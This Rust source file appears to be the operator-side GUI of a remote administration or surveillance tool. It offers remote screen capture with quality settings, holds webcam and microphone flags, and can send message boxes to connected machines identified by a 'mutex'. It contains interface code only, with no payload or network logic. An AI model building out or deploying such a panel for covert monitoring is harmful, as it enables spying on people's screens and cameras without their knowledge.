use crate::manager::types::UiManagerCommand;
use egui::{
    CollapsingHeader, Color32, ColorImage, Context, Frame, Id, Image, Margin, RadioButton, Stroke,
    TextureHandle, Window,
};
use shared::commands::{
    CaptureCommand, CaptureQuality, CaptureType, Command, ComputerInfoResponse, MessageBoxArgs,
};
use tokio::sync::mpsc::UnboundedSender;

pub struct MsgboxView {
    pub title: String,
    pub text: String,
}
impl Default for MsgboxView {
    fn default() -> Self {
        Self {
            title: String::from("Title"),
            text: String::from("Text"),
        }
    }
}

pub struct ClientViewCaptureState {
    pub screen: bool,
    pub webcam: bool,
    pub mic: bool,
}
impl Default for ClientViewCaptureState {
    fn default() -> Self {
        Self {
            screen: false,
            webcam: false,
            mic: false,
        }
    }
}

pub struct ClientViewCapture {
    pub quality: CaptureQuality,
    pub data: Option<ColorImage>,
}
pub struct ClientViewCaptures {
    pub screen: ClientViewCapture,
    pub webcam: ClientViewCapture,
}
pub struct ClientViewTextures {
    pub screen: Option<TextureHandle>,
    pub webcam: Option<TextureHandle>,
}
pub struct ClientViewState {
    pub visible: bool,
    pub captures: ClientViewCaptures,
    pub textures: ClientViewTextures,
    pub capturing: ClientViewCaptureState,
    pub msgbox: MsgboxView,
}
pub struct ClientView {
    pub mutex: String,
    pub state: ClientViewState,
    pub socket: String,
    pub info: ComputerInfoResponse,
    sender: UnboundedSender<UiManagerCommand>,
}
impl ClientView {
    pub fn new(
        socket: String,
        mutex: String,
        info: ComputerInfoResponse,
        sender: UnboundedSender<UiManagerCommand>,
    ) -> Self {
        Self {
            mutex: mutex,
            socket: socket,
            state: ClientViewState {
                visible: false,
                captures: ClientViewCaptures {
                    screen: ClientViewCapture {
                        quality: CaptureQuality::Speed,
                        data: None,
                    },
                    webcam: ClientViewCapture {
                        quality: CaptureQuality::Speed,
                        data: None,
                    },
                },
                textures: ClientViewTextures {
                    screen: None,
                    webcam: None,
                },
                capturing: ClientViewCaptureState::default(),
                msgbox: MsgboxView::default(),
            },
            // socket: socket,
            info: info,
            sender: sender,
        }
    }
}

pub fn render(ctx: &Context, view: &mut ClientView) {
    Window::new(view.info.hostname.clone())
        .id(Id::new(&view.mutex)) // rely on the mutex in case connected devices share a hostname (for whatever reason)
        .open(&mut view.state.visible)
        .resizable(true)
        .show(ctx, |ui| {
            CollapsingHeader::new("Surveillance")
                .default_open(true)
                .show(ui, |ui| {
                    CollapsingHeader::new("Screen")
                        .default_open(false)
                        .show(ui, |ui| {
                            if let Some(ref image) = view.state.captures.screen.data {
                                if view.state.textures.screen.is_none() {
                                    view.state.textures.screen = Some(ui.ctx().load_texture(
                                        format!("capture_{}", view.mutex.clone()),
                                        image.clone(),
                                        Default::default(),
                                    ));
                                };
                                if let Some(texture) = &view.state.textures.screen {
                                    let available_size = ui.available_size();
                                    let image_size = texture.size_vec2();
                                    let max_width = available_size.x.min(720.0);
                                    let max_height = available_size.y.min(560.0);
                                    let scale_x = max_width / image_size.x;
                                    let scale_y = max_height / image_size.y;
                                    let scale = scale_x.min(scale_y).min(1.0);
                                    let display_size = image_size * scale;
                                    ui.add(Image::new(texture).max_size(display_size));
                                }
                            }

                            if view.state.capturing.screen {
                                if ui.button("Stop").clicked() {
                                    println!("[*] sending CaptureCommand::Stop");
                                    let _ = view.sender.send(UiManagerCommand::SendCommand(
                                        view.mutex.clone(),
                                        Command::Capture(CaptureCommand::Stop, CaptureType::Screen),
                                    ));
                                    view.state.capturing.screen = false;
                                }
                            } else {
                                if ui.button("Start").clicked() {
                                    println!("[*] sending CaptureCommand::Start");
                                    let _ = view.sender.send(UiManagerCommand::SendCommand(
                                        view.mutex.clone(),
                                        Command::Capture(
                                            CaptureCommand::Start(
                                                view.state.captures.screen.quality.clone(),
                                            ),
                                            CaptureType::Screen,
                                        ),
                                    ));
                                    view.state.capturing.screen = true;
                                };
                            }

                            //////////////////////////////////////
                            // quality toggle
                            if ui
                                .add(RadioButton::new(
                                    view.state.captures.screen.quality == CaptureQuality::Quality,
                                    "Quality",
                                ))
                                .clicked()
                            {
                                if view.state.captures.screen.quality == CaptureQuality::Quality {
                                    return; // don't restart for no reason
                                }
                                view.state.captures.screen.quality = CaptureQuality::Quality;
                                if !view.state.capturing.screen {
                                    return;
                                } // don't start if not capturing
                                // stop capture
                                let _ = view.sender.send(UiManagerCommand::SendCommand(
                                    view.mutex.clone(),
                                    Command::Capture(CaptureCommand::Stop, CaptureType::Screen),
                                ));
                                // start capture
                                let _ = view.sender.send(UiManagerCommand::SendCommand(
                                    view.mutex.clone(),
                                    Command::Capture(
                                        CaptureCommand::Start(CaptureQuality::Quality),
                                        CaptureType::Screen,
                                    ),
                                ));
                            }
                            // speed toggle

                            if ui
                                .add(RadioButton::new(
                                    view.state.captures.screen.quality == CaptureQuality::Speed,
                                    "Speed",
                                ))
                                .clicked()
                            {
                                if view.state.captures.screen.quality == CaptureQuality::Speed {
                                    return; // don't restart for no reason
                                }
                                view.state.captures.screen.quality = CaptureQuality::Speed;
                                if !view.state.capturing.screen {
                                    return;
                                } // don't start if not capturing
                                // stop capture
                                let _ = view.sender.send(UiManagerCommand::SendCommand(
                                    view.mutex.clone(),
                                    Command::Capture(CaptureCommand::Stop, CaptureType::Screen),
                                ));
                                // start capture
                                let _ = view.sender.send(UiManagerCommand::SendCommand(
                                    view.mutex.clone(),
                                    Command::Capture(
                                        CaptureCommand::Start(CaptureQuality::Speed),
                                        CaptureType::Screen,
                                    ),
                                ));
                            }
                        });
                });
            CollapsingHeader::new("Utility")
                .default_open(true)
                .show(ui, |ui| {
                    CollapsingHeader::new("MessageBox")
                        .default_open(false)
                        .show(ui, |ui| {
                            ui.text_edit_singleline(&mut view.state.msgbox.title);
                            ui.text_edit_multiline(&mut view.state.msgbox.text);

                            if ui.button("Send").clicked() {
                                let _ = view.sender.send(UiManagerCommand::SendCommand(
                                    view.mutex.clone(),
                                    Command::MessageBox(MessageBoxArgs {
                                        title: view.state.msgbox.title.clone(),
                                        text: view.state.msgbox.text.clone(),
                                    }),
                                ));
                            }
                        })
                });

            let disconnect = eframe::egui::Button::new("Disconnect")
                .fill(Color32::DARK_RED)
                .stroke(Stroke::new(1.0, Color32::BLACK));
            Frame::new().inner_margin(Margin::same(4)).show(ui, |ui| {
                if ui.add(disconnect).clicked() {
                    let _ = view
                        .sender
                        .send(UiManagerCommand::Disconnect(view.mutex.clone()));
                }
            })
        });
}
